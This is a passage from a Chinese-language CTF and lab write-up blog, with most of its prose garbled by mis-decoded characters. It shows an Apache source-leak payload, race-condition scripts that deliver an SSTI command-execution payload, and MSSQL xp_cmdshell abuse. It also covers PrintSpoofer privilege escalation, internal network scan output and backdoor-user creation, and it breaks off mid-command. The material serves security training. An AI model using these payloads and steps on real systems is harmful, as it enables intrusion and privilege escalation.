ç¼–è¯‘åè¦†å†™åˆ°å‚¨å­˜æ¡¶ä¸Š\nè®¿é—®/abc\næ‹¿åˆ°flag\nLevel 38475 è§’è½ ssti/æ¡ä»¶ç«äº‰\n/robots.txtæœ‰ä¸ª/app.conf\nè®¿é—®/app.conf\nè¿™é‡Œå±•ç¤ºäº†httpd.confçš„ç‰‡æ®µ\nè¿™é‡Œç»™å‡ºäº†æºç çš„ä½ç½®è¿˜æœ‰ä¸€ä¸ªé‡å†™å¼•æ“çš„è§„åˆ™ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯è¯¥ç‰ˆæœ¬çš„apacheå­˜åœ¨æºç æ³„éœ²\nåŒæ—¶åœ¨å“åº”æ ‡å¤´èƒ½æ‰¾åˆ°Apacheçš„ç‰ˆæœ¬ä¿¡æ¯\nå¯ä»¥æ‰¾åˆ°è¿™ä¸ªç‰ˆæœ¬çš„apacheå­˜åœ¨æºç æ³„éœ²ï¼Œè€Œä¸”æ˜¯è·Ÿé‡å†™è§„åˆ™æœ‰å…³\nCVE-2024-38475\nç½‘ä¸Šæ²¡æ‰¾åˆ°ä»€ä¹ˆpoc\nä½†æ˜¯å¯ä»¥æ‰¾åˆ°æ¼æ´å‘ç°è€…çš„ä¸€ç¯‡æ–‡ç« \nhttps://blog.orange.tw/posts/2024-08-confusion-attacks-en/\næ ¹æ®è¿™ç¯‡æ–‡ç« æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºpaylaod\nhttp://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F è¿™é“é¢˜å¤šäº†ä¸€ä¸ªRewriteCond \u0026ldquo;%{HTTP_USER_AGENT}\u0026rdquo; \u0026ldquo;^L1nk/\u0026rdquo;ï¼Œåªéœ€è¦åœ¨user-agentå‰é¢åŠ ä¸ŠL1nk/å³å¯\næ‹¿åˆ°æºç \n1from flask import Flask, request, render_template, render_template_string, redirect 2import os 3import templates 4 5app = Flask(__name__) 6pwd = os.path.dirname(__file__) 7show_msg = templates.show_msg 8 9 10def readmsg(): 11\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 12\tif os.path.exists(filename): 13\tf = open(filename, \u0026#39;r\u0026#39;) 14\tmessage = f.read() 15\tf.close() 16\treturn message 17\telse: 18\treturn \u0026#39;No message now.\u0026#39; 19 20 21@app.route(\u0026#39;/index\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 22def index(): 23\tstatus = request.args.get(\u0026#39;status\u0026#39;) 24\tif status is None: 25\tstatus = \u0026#39;\u0026#39; 26\treturn render_template(\u0026#34;index.html\u0026#34;, status=status) 27 28 29@app.route(\u0026#39;/send\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 30def write_message(): 31\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 32\tmessage = request.form[\u0026#39;message\u0026#39;] 33 34\tf = open(filename, \u0026#39;w\u0026#39;) 35\tf.write(message) 36\tf.close() 37 38\treturn redirect(\u0026#39;index?status=Send successfully!!\u0026#39;) 39\t40@app.route(\u0026#39;/read\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 41def read_message(): 42\tif \u0026#34;{\u0026#34; not in readmsg(): 43\tshow = show_msg.replace(\u0026#34;{{message}}\u0026#34;, readmsg()) 44\treturn render_template_string(show) 45\treturn \u0026#39;waf!!\u0026#39; 46\t47 48if __name__ == \u0026#39;__main__\u0026#39;: 49\tapp.run(host = \u0026#39;0.0.0.0\u0026#39;, port = 5000) å¯ä»¥çœ‹åˆ°/readè·¯ç”±å­˜åœ¨sstiï¼Œä½†æ˜¯ä»–wafæ‰äº†æœ€é‡è¦çš„{\nä½†æ˜¯å¯ä»¥çœ‹åˆ°è¿™ä¸ª/sendè·¯ç”±ä¼šå°†ä¼ å…¥çš„ä¿¡æ¯å†™å…¥message.txtæ–‡ä»¶ï¼Œåœ¨è®¿é—®/readè·¯ç”±çš„æ—¶å€™åˆ™ä¼šè¯»å–message.txtæ–‡ä»¶ã€‚è¿™ä¹ˆä¸€æ¥æˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘é€šè¿‡ç«äº‰çš„æ–¹å¼æ¥ç»•è¿‡wafäº†ã€‚ç«äº‰æ€è·¯å¤§æ¦‚å°±æ˜¯æˆ‘åœ¨å¾ˆçŸ­çš„æ—¶é—´å†…è¿ç»­å‘é€ä¸¤æ¡ä¿¡æ¯ï¼Œç¬¬ä¸€æ¡ä¿¡æ¯æ˜¯åˆæ³•ä¿¡æ¯ï¼Œè€Œç¬¬äºŒæ¡ä¿¡æ¯æ˜¯ä¸åˆæ³•çš„ï¼Œé‚£ä¹ˆå°±ä¼šå­˜åœ¨ä¸€ç§æƒ…å†µï¼Œå½“ç¬¬ä¸€æ¡ä¿¡æ¯é€šè¿‡äº†åˆ¤æ–­ï¼Œæ¥ä¸‹æ¥è¦å°†æ–‡ä»¶çš„å†…å®¹æ’å…¥åˆ°æ¨¡æ¿ä¸­æ¸²æŸ“çš„æ—¶å€™ï¼Œåˆšå¥½ç¬¬äºŒæ¡ä¸åˆæ³•çš„ä¿¡æ¯è¦†å†™äº†message.txtï¼Œé‚£ä¹ˆæ’å…¥æ¨¡æ¿ä¸­çš„å°±æ˜¯ç¬¬äºŒæ¡ä¸åˆæ³•çš„ä¿¡æ¯äº†\næ¥ä¸‹æ¥å°±æ˜¯æ“è„šæœ¬å‘åŒ…\nä¸‰ä¸ªè„šæœ¬\npoc1\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /flag\u0026#39;).read()}}\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) 8 poc2\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;123\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) poc3\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/read\u0026#34; 4 burp0_headers = {\u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 res = requests.get(burp0_url, headers=burp0_headers) 6 # print(res.text) 7 if \u0026#34;hgame\u0026#34; in (res.text): 8 print(res.text) 9 break æˆåŠŸæ‰§è¡Œï¼Œæ‹¿åˆ°flag\n","permalink":"http://localhost:1313/post/hgame2025-week1/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"week1\"\u003eweek1\u003c/h3\u003e\n\u003ch3 id=\"level-24-pacman\"\u003eLevel 24 Pacman\u003c/h3\u003e\n\u003cp\u003eæ‹¿åˆ°ç¯å¢ƒ\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151704506\" loading=\"lazy\" src=\"../assets/image-20250206151704506.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸€ä¸ªå°æ¸¸æˆï¼ŒçŒœæµ‹åº”è¯¥æ˜¯jså®¡è®¡\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151846623\" loading=\"lazy\" src=\"../assets/image-20250206151846623.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæŸ¥çœ‹index.jså‘ç°ä»£ç è¿›è¡Œäº†æ··æ·†\u003c/p\u003e\n\u003cp\u003eå¯ä»¥ç”¨å·¥å…·åæ··æ·†ä¸€ä¸‹ï¼Œå¢åŠ ä¸€ä¸‹å¯è¯»æ€§\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tool.yuanrenxue.cn/decode_obfuscator\"\u003ehttps://tool.yuanrenxue.cn/decode_obfuscator\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152531656\" loading=\"lazy\" src=\"../assets/image-20250206152531656.png\"\u003e\u003c/p\u003e\n\u003cp\u003eåæ··æ·†ä¹‹åæ‰¾åˆ°è¿™ä¸ª\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152608227\" loading=\"lazy\" src=\"../assets/image-20250206152608227.png\"\u003e\u003c/p\u003e","title":"HGAME2025 WEEK1"},{"content":"","permalink":"http://localhost:1313/about/","summary":"about","title":"å…³äº"},{"content":"Tsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚\nå‚è€ƒæ–‡ç« \næ˜¥ç§‹äº‘é•œ TSclient \u0026ndash; Walkthrough - KingBridge - åšå®¢å›­\næ˜¥ç§‹äº‘å¢ƒ Tsclient | åˆé›¶Â·b10g~ğŸ¥\nFLAG1 å…ˆç”¨fscanæ‰«ä¸€ä¸‹\nmssqlæœåŠ¡æ˜¯å¼±å£ä»¤\nsa/1qaz!QAZ ç”¨æ•°æ®åº“ç®¡ç†å·¥å…·è¿ä¸Šå»\næ¥ä¸‹æ¥è¦çœ‹mssqlæ€ä¹ˆè¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nå‚è€ƒæ–‡ç« ï¼š\nhttps://xz.aliyun.com/news/7129\nåˆ¤æ–­xp_cmdshellçŠ¶æ€\nselect * from master.dbo.sysobjects where xtype=\u0026#39;x\u0026#39; and name=\u0026#39;xp_cmdshell\u0026#39; å­˜åœ¨\né‚£æˆ‘ä»¬æ¥ä¸‹æ¥å¯åŠ¨å®ƒ\nEXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1;RECONFIGURE;EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;RECONFIGURE; é…ç½®é€‰é¡¹ \u0026#39;xp_cmdshell\u0026#39; å·²ä» 0 æ›´æ”¹ä¸º 1ã€‚è¯·è¿è¡Œ RECONFIGURE è¯­å¥è¿›è¡Œå®‰è£…ã€‚ å¯åŠ¨æˆåŠŸ\næ¥ä¸‹æ¥å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†\nexec master..xp_cmdshell \u0026#39;whoami\u0026#39; æ¥ä¸‹æ¥ç›´æ¥vshellä¸€å¥è¯ä¸Šçº¿\næ²¡æ‰¾åˆ°flagï¼Œå‘ç°Administratoræ–‡ä»¶å¤¹æ²¡æœ‰æƒé™\næƒ³åˆ°è¦ææƒï¼Œä¼ ä¸€ä¸ªPrintSpooferè¿›è¡Œææƒ\nhttps://github.com/whojeff/PrintSpoofer\n1PrintSpoofer.exe -i -c cmd ææƒä¹‹åæ‹¿åˆ°flag\n1C:\\Tmp\u0026gt;type C:\\Users\\Administrator\\flag\\flag01.txt 2 _________ ________ ________ ___ ___ _______ ________ _________ 3|\\___ ___\\\\ ____\\|\\ ____\\|\\ \\ |\\ \\|\\ ___ \\ |\\ ___ \\|\\___ ___\\ 4\\|___ \\ \\_\\ \\ \\___|\\ \\ \\___|\\ \\ \\ \\ \\ \\ \\ __/|\\ \\ \\\\ \\ \\|___ \\ \\_| 5 \\ \\ \\ \\ \\_____ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\_|/_\\ \\ \\\\ \\ \\ \\ \\ \\ 6 \\ \\ \\ \\|____|\\ \\ \\ \\____\\ \\ \\____\\ \\ \\ \\ \\_|\\ \\ \\ \\\\ \\ \\ \\ \\ \\ 7 \\ \\__\\ ____\\_\\ \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\ \\__\\ 8 \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__| \\|__| 9 \\|_________| 10 11 12Getting flag01 is easy, right? 13 14flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4} 15 16 17Maybe you should focus on user sessions... ææƒä¹‹åç”¨ææƒåçš„è´¦æˆ·é‡æ–°ä¸Šä¸€ä¸‹çº¿\næ¥ä¸‹æ¥ç”¨fscanæ‰«ä¸€ä¸‹å†…ç½‘\n1â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” 2â”‚ ___ _ â”‚ 3â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚ 4â”‚ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / â”‚ 5â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; â”‚ 6â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚ 7â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ 8 Fscan Version: 2.0.0 9 10[2025-03-09 19:53:19] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1 11[2025-03-09 19:53:19] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ 12[2025-03-09 19:53:19] [INFO] CIDRèŒƒå›´: 172.22.8.0-172.22.8.255 13[2025-03-09 19:53:20] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.8.0.%!d(string=172.22.8.255) - %!s(MISSING).%!d(MISSING) 14[2025-03-09 19:53:20] [INFO] è§£æCIDR 172.22.8.0/24 -\u0026gt; IPèŒƒå›´ 172.22.8.0-172.22.8.255 15[2025-03-09 19:53:20] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256 16[2025-03-09 19:53:20] [INFO] å¼€å§‹ä¸»æœºæ‰«æ 17[2025-03-09 19:53:20] [INFO] æ­£åœ¨å°è¯•æ— ç›‘å¬ICMPæ¢æµ‹... 18[2025-03-09 19:53:20] [INFO] å½“å‰ç”¨æˆ·æƒé™ä¸è¶³,æ— æ³•å‘é€ICMPåŒ… 19[2025-03-09 19:53:20] [INFO] åˆ‡æ¢ä¸ºPINGæ–¹å¼æ¢æµ‹... 20[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.31 å­˜æ´» (ICMP) 21[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.18 å­˜æ´» (ICMP) 22[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.15 å­˜æ´» (ICMP) 23[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.46 å­˜æ´» (ICMP) 24[2025-03-09 19:53:23] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4 25[2025-03-09 19:53:23] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233 26[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:88 27[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:80 28[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:80 29[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:139 30[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:139 31[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:135 32[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:135 33[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:135 34[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:135 35[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:139 36[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:139 37[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:445 38[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:445 39[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:445 40[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:445 41[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:389 42[2025-03-09 19:53:26] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:1433 43[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:88 =\u0026gt; 44[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:80 =\u0026gt; [http] 45[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:80 =\u0026gt; [http] 46[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:139 =\u0026gt; Banner:[.] 47[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:139 =\u0026gt; Banner:[.] 48[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:139 =\u0026gt; Banner:[.] 49[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:139 =\u0026gt; Banner:[.] 50[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:445 =\u0026gt; 51[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:445 =\u0026gt; 52[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:445 =\u0026gt; 53[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:445 =\u0026gt; 54[2025-03-09 19:53:31] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:1433 =\u0026gt; [ms-sql-s] ç‰ˆæœ¬:13.00.1601 äº§å“:Microsoft SQL Server 2016 ç³»ç»Ÿ:Windows Banner:[.%.A.] 55[2025-03-09 19:53:35] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:389 =\u0026gt; 56[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:135 =\u0026gt; 57[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:135 =\u0026gt; 58[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:135 =\u0026gt; 59[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:135 =\u0026gt; 60[2025-03-09 19:54:29] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 17 61[2025-03-09 19:54:30] [INFO] å¼€å§‹æ¼æ´æ‰«æ 62[2025-03-09 19:54:30] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle 63[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 64ç›®æ ‡ä¸»æœº: 172.22.8.18 65ä¸»æœºå: WIN-WEB 66å‘ç°çš„ç½‘ç»œæ¥å£: 67 IPv4åœ°å€: 68 â””â”€ 172.22.8.18 69 IPv6åœ°å€: 70 â””â”€ 2001:0:348b:fb58:1445:3719:d89d:8092 71[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT 72[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 73ç›®æ ‡ä¸»æœº: 172.22.8.15 74ä¸»æœºå: DC01 75å‘ç°çš„ç½‘ç»œæ¥å£: 76 IPv4åœ°å€: 77 â””â”€ 172.22.8.15 78[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 79ç›®æ ‡ä¸»æœº: 172.22.8.46 80ä¸»æœºå: WIN2016 81å‘ç°çš„ç½‘ç»œæ¥å£: 82 IPv4åœ°å€: 83 â””â”€ 172.22.8.46 84[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 85ç›®æ ‡ä¸»æœº: 172.22.8.31 86ä¸»æœºå: WIN19-CLIENT 87å‘ç°çš„ç½‘ç»œæ¥å£: 88 IPv4åœ°å€: 89 â””â”€ 172.22.8.31 90[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393 91[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15 DC:XIAORANG\\DC01 92[2025-03-09 19:54:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.8.46 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server 93[2025-03-09 19:54:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.8.18 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server 94[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ 95[2025-03-09 19:54:53] [SUCCESS] æ‰«æå·²å®Œæˆ: 32/32 æ‰«åˆ°ä¸‰å°æœºå­\nNetBios 172.22.8.46 WIN2016.xiaorang.lab NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT\rNetBios 172.22.8.15 DC:XIAORANG\\DC01 æ²¡æœ‰ä»€ä¹ˆèƒ½ç›´æ¥åˆ©ç”¨çš„æœåŠ¡\né‚£æˆ‘ä»¬æ¥ç€ä¿¡æ¯æ”¶é›†ä¸€ä¸‹\nnet user ä¸»æœºå: WIN-WEB\rOS åç§°: Microsoft Windows Server 2016 Datacenter\rOS ç‰ˆæœ¬: 10.0.14393 æš‚ç¼º Build 14393\rOS åˆ¶é€ å•†: Microsoft Corporation\rOS é…ç½®: ç‹¬ç«‹æœåŠ¡å™¨\rOS æ„ä»¶ç±»å‹: Multiprocessor Free\ræ³¨å†Œçš„æ‰€æœ‰äºº:\ræ³¨å†Œçš„ç»„ç»‡: Aliyun\räº§å“ ID: 00376-40000-00000-AA947\råˆå§‹å®‰è£…æ—¥æœŸ: 2022/7/11, 12:46:14\rç³»ç»Ÿå¯åŠ¨æ—¶é—´: 2025/3/9, 18:28:29\rç³»ç»Ÿåˆ¶é€ å•†: Alibaba Cloud\rç³»ç»Ÿå‹å·: Alibaba Cloud ECS\rç³»ç»Ÿç±»å‹: x64-based PC\rå¤„ç†å™¨: å®‰è£…äº† 1 ä¸ªå¤„ç†å™¨ã€‚\r[01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz\rBIOS ç‰ˆæœ¬: SeaBIOS 449e491, 2014/4/1\rWindows ç›®å½•: C:\\Windows\rç³»ç»Ÿç›®å½•: C:\\Windows\\system32\rå¯åŠ¨è®¾å¤‡: \\Device\\HarddiskVolume1\rç³»ç»ŸåŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½)\rè¾“å…¥æ³•åŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½)\ræ—¶åŒº: (UTC+08:00) åŒ—äº¬ï¼Œé‡åº†ï¼Œé¦™æ¸¯ç‰¹åˆ«è¡Œæ”¿åŒºï¼Œä¹Œé²æœ¨é½\rç‰©ç†å†…å­˜æ€»é‡: 3,950 MB\rå¯ç”¨çš„ç‰©ç†å†…å­˜: 883 MB\rè™šæ‹Ÿå†…å­˜: æœ€å¤§å€¼: 5,848 MB\rè™šæ‹Ÿå†…å­˜: å¯ç”¨: 1,169 MB\rè™šæ‹Ÿå†…å­˜: ä½¿ç”¨ä¸­: 4,679 MB\ré¡µé¢æ–‡ä»¶ä½ç½®: C:\\pagefile.sys\råŸŸ: WORKGROUP\rç™»å½•æœåŠ¡å™¨: æš‚ç¼º\rä¿®è¡¥ç¨‹åº: å®‰è£…äº† 6 ä¸ªä¿®è¡¥ç¨‹åºã€‚\r[01]: KB5013625\r[02]: KB4049065\r[03]: KB4486129\r[04]: KB4486131\r[05]: KB5014026\r[06]: KB5013952\rç½‘å¡: å®‰è£…äº† 1 ä¸ª NICã€‚\r[01]: Red Hat VirtIO Ethernet Adapter\rè¿æ¥å: ä»¥å¤ªç½‘\rå¯ç”¨ DHCP: æ˜¯\rDHCP æœåŠ¡å™¨: 172.22.255.253\rIP åœ°å€\r[01]: 172.22.8.18\r[02]: fe80::205a:dd47:2165:6397\rHyper-V è¦æ±‚: å·²æ£€æµ‹åˆ°è™šæ‹Ÿæœºç›‘æ§ç¨‹åºã€‚å°†ä¸æ˜¾ç¤º Hyper-V æ‰€éœ€çš„åŠŸèƒ½ã€‚ C:\\Tmp\u0026gt;net user\r\\\\ çš„ç”¨æˆ·å¸æˆ·\r-------------------------------------------------------------------------------\rAdministrator DefaultAccount Guest\rJohn test\rå‘½ä»¤è¿è¡Œå®Œæ¯•ï¼Œä½†å‘ç”Ÿä¸€ä¸ªæˆ–å¤šä¸ªé”™è¯¯ã€‚ C:\\Tmp\u0026gt;quser\rç”¨æˆ·å ä¼šè¯å ID çŠ¶æ€ ç©ºé—²æ—¶é—´ ç™»å½•æ—¶é—´\rjohn rdp-tcp#0 2 è¿è¡Œä¸­ 2:38 2025/3/9 18:30 å‘ç°ä¸€ä¸ªjohnç”¨æˆ·è¿œç¨‹è¿æ¥æœ¬å°æœºå­\nä¸ºäº†æ–¹ä¾¿å¯ä»¥æ–°å»ºä¸€ä¸ªç”¨æˆ·rdpè¿ä¸Šå»\nC:\\Tmp\u0026gt;net user xrntkk Abc20060201 